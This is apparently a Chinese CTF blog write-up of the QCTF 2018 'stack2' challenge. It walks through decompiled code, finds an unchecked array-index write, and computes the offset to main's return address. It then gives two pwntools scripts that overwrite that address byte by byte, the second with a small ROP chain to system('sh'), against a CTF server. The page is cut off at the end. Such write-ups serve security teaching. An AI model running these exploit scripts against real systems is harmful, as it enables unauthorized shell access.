@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="一道常规的通过栈溢出控制EIP从而改变程序path的题目 先检查一下获得的文件 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  可知开启了NX和Canary防护，我们运行一下这个程序 12345678">
+<meta property="og:type" content="article">
+<meta property="og:title" content="4th-QCTF-2018-stack2">
+<meta property="og:url" content="http://yoursite.com/2019/09/05/4th-QCTF-2018-stack2/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="一道常规的通过栈溢出控制EIP从而改变程序path的题目 先检查一下获得的文件 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  可知开启了NX和Canary防护，我们运行一下这个程序 12345678">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-09-06T05:35:04.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="4th-QCTF-2018-stack2">
+<meta name="twitter:description" content="一道常规的通过栈溢出控制EIP从而改变程序path的题目 先检查一下获得的文件 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  可知开启了NX和Canary防护，我们运行一下这个程序 12345678">
+  <link rel="canonical" href="http://yoursite.com/2019/09/05/4th-QCTF-2018-stack2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>4th-QCTF-2018-stack2 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/05/4th-QCTF-2018-stack2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">4th-QCTF-2018-stack2
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-09-05 07:34:31 / Geändert am: 22:35:04" itemprop="dateCreated datePublished" datetime="2019-09-05T07:34:31-07:00">2019-09-05</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>一道常规的通过栈溢出控制<strong>EIP</strong>从而改变程序path的题目</p>
+<p>先检查一下获得的文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可知开启了NX和Canary防护，我们运行一下这个程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">***********************************************************</span><br><span class="line">*                      An easy calc                       *</span><br><span class="line">*Give me your numbers and I will return to you an average *</span><br><span class="line">*(0 &lt;= x &lt; 256)                                           *</span><br><span class="line">***********************************************************</span><br><span class="line">How many numbers you have:</span><br><span class="line">10</span><br><span class="line">Give me your numbers</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">1. show numbers</span><br><span class="line">2. add number</span><br><span class="line">3. change number</span><br><span class="line">4. get average</span><br><span class="line">5. exit</span><br></pre></td></tr></table></figure>
+
+<p>大概就是一个求平均数的程序，我们用IDA Pro看一下反汇编代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>毫无头绪，我们先尝试搜索一下<code>flag</code>，<code>sysytem</code>，<code>cat</code>等常用字符串，看看能不能寻找到什么有用的线索，我们发现了<code>hackhere</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:0804859B                 public hackhere</span><br><span class="line">.text:0804859B hackhere        proc near</span><br><span class="line">.text:0804859B</span><br><span class="line">.text:0804859B var_C           = dword ptr -0Ch</span><br><span class="line">.text:0804859B</span><br><span class="line">.text:0804859B ; __unwind &#123;</span><br><span class="line">.text:0804859B                 push    ebp</span><br><span class="line">.text:0804859C                 mov     ebp, esp</span><br><span class="line">.text:0804859E                 sub     esp, 18h</span><br><span class="line">.text:080485A1                 mov     eax, large gs:14h</span><br><span class="line">.text:080485A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:080485AA                 xor     eax, eax</span><br><span class="line">.text:080485AC                 sub     esp, 0Ch</span><br><span class="line">.text:080485AF                 push    offset command  ; &quot;/bin/bash&quot;</span><br><span class="line">.text:080485B4                 call    _system</span><br><span class="line">.text:080485B9                 add     esp, 10h</span><br><span class="line">.text:080485BC                 nop</span><br><span class="line">.text:080485BD                 mov     edx, [ebp+var_C]</span><br><span class="line">.text:080485C0                 xor     edx, large gs:14h</span><br><span class="line">.text:080485C7                 jz      short locret_80485CE</span><br><span class="line">.text:080485C9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们现在大概有思路了，就是通过栈溢出控制程序的path到这个函数上就可以查看到<strong>flag</strong>了，现在来分析程序，可以看到两个溢出点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">     __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">     v13[v5] = v7;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以知道第一个溢出点是没有什么作用的，然后看看第二个溢出点，这里就是bug了，因为我们没有检查<strong>v13</strong>数组的边界，这里我们可以随意输入，然后劫持程序<strong>EIP</strong>，问题是这里的<strong>v13</strong>是<strong>char</strong>类型的数组，在<strong>32</strong>位系统中，一个<strong>char</strong>类型占用一个<strong>1</strong>字节，而地址是以<strong>int</strong>类型存储的，在<strong>32</strong>位系统中占用<strong>4</strong>字节，等于说我们需要把地址拆分成<strong>4</strong>个字节输入</p>
+<p>我们知道我们需要达到的地址是：<strong>0x080485AF</strong>，在Linux中数据的存储的小端序结构，所以我们需要把这串地址反着拆成两个两个一组的组合：<strong>0xAF</strong>、<strong>0x85</strong>、<strong>0x04</strong>、<strong>0x08</strong></p>
+<p>这题的溢出点如果不是用<code>pattern.py</code>脚本计算而是手动计算的话有点小坑，我们的目标是修改<strong>main</strong>函数的返回地址到<strong>0x080485AF</strong>，所以我们需要找到存放<strong>main</strong>函数返回地址的内存与字符串数组内存的偏移量</p>
+<p>我们注意到main函数开头和结尾的汇编代码</p>
+<p>开头</p>
+<p><code>.text:080485D0                 lea     ecx, [esp+4]</code></p>
+<p>结尾</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080488EF                 lea     esp, [ecx-4]</span><br><span class="line">.text:080488F2                 retn</span><br></pre></td></tr></table></figure>
+
+<p>可以知道最后<strong>main</strong>函数的返回值，是由<strong>esp</strong>决定的，而最后<strong>esp</strong>的值又是由<strong>ecx</strong>的值决定的，而<strong>ecx</strong>的值是由一开始<strong>esp</strong>的值决定的。由于我们通过静态分析，无法得知一开始时<strong>esp</strong>的内存位置，故当最后返回地址时<strong>esp</strong>的值我们也无法确定，我们需要通过动态调试才能得知一开始时<strong>esp</strong>的内存地址和最后返回的地址，计算得出偏移</p>
+<p><strong>0xFFFFCEF8</strong>是数组的地址，<strong>0xFFFFCF7C</strong>是存放<code>main</code>函数返回地址，故<code>pwndbg&gt; p/x 0xffffcf7c-0xffffcef8
+$1 = 0x84</code>，可以得出偏移量（溢出点）为<strong>0x84</strong></p>
+<p>所以Exploit为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">system_addr=<span class="number">0x080485AF</span></span><br><span class="line">leave_offset=<span class="number">0x84</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span><span class="params">(addr,va)</span>:</span></span><br><span class="line">	io.sendline(<span class="string">"3"</span>)</span><br><span class="line">	io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	io.sendline(str(addr))</span><br><span class="line">	io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	io.sendline(str(va))</span><br><span class="line">	io.recvuntil(<span class="string">"5. exit\n"</span>) </span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"><span class="comment"># write  system_addr</span></span><br><span class="line">write_addr(leave_offset,<span class="number">0XAF</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X85</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个题有个坑点在于题目给出了<code>getshell</code>的函数，但是出题人在搭建<strong>docker</strong>环境时未注意，环境中只给了<code>sh</code>，在发现问题后考虑到题目依然可解就未再次更改环境。题目依然是简单的栈溢出，只不过不能直接跳转到<code>getshell</code>，需要简单的<strong>ROP</strong>一下，我们只需要找到<code>system</code>函数的调用地址和<code>bin/sh</code>的字符串地址即可</p>
+<p>最终的Exploit为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">system_addr=<span class="number">0x080485AF</span></span><br><span class="line">leave_offset=<span class="number">0x84</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span><span class="params">(addr,va)</span>:</span></span><br><span class="line">	io.sendline(<span class="string">"3"</span>)</span><br><span class="line">	io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	io.sendline(str(addr))</span><br><span class="line">	io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	io.sendline(str(va))</span><br><span class="line">	io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"><span class="comment"># write  system_addr  0x08048450</span></span><br><span class="line">write_addr(leave_offset,<span class="number">0X50</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X84</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line"><span class="comment"># sh_addr  0x08048987</span></span><br><span class="line">leave_offset+=<span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> leave_offset</span><br><span class="line">write_addr(leave_offset,<span class="number">0x87</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X89</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
